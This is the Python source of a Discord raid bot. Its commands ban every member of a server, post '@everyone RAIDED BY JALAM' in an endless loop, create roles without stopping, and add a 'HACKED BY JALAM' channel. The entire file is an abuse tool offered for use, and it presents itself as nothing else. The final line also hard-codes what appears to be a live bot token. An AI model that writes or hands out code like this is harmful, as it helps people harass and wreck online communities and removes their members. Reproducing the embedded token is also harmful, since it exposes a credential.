import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get

 
##PREFIX##

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

client = commands.Bot(command_prefix='!', intents=discord.Intents.all())

##OTHER##
bot.remove_command('help')



##BOT IS READY##
@bot.event
async def on_ready():
#BOT STATUS#
    print("Bot Is Online! Getting Ready To Spam.")
    print(f"Bot Status: Online!...")



##BAN ALL COMMAND##
@bot.command(pass_context=True)
async def banall(ctx):
    guild = ctx.message.guild
    for member in guild.members:
        try:
            await member.ban()
        except:
            pass
    await ctx.message.delete()

 
##SPAM COMMAND##
@bot.command(pass_context=True)
async def spam(ctx): #run "!spam" to run the command
    await ctx.message.delete()
    while True:
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send(
            "@everyone RAIDED BY JALAM")
        await ctx.send("@everyone RAIDED BY JALAM")


##SPAM ROLE##
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="RAIDED BY JALAM SMD") 

##MAKE CHANNELS##
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('HACKED BY JALAM')

##BOT TOKEN##
bot.run("OTI0MzYxMzM1NTk5NDE1MzI2.GeGxLO.fDWVt_4HR6HHmB0-JJyW-PnVQSUJWcxT-Q794Q", reconnect=True)